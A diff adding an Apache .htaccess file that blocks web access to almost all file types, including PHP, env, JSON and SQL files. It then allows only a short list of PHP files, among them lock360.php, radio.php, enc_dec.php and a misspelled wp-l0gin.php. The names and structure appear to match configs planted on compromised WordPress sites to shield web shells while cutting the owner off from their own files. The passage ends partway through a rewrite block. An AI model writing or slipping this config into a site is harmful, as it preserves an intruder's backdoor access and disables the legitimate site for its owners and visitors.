@@ -1,0 +1,14 @@
+<FilesMatch ".(py|exe|php|env|json|js|css|xlsx|png|jpeg|jpg|gif|p8|html|txt|sql|md|babelrc|gitignore|yml|prettierrc)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|wp-l0gin.php|wp-theme.php|wp-scripts.php|wp-editor.php|enc_dec.php)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(common.js|constants.js|database.js|template.js)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+Options -Indexes
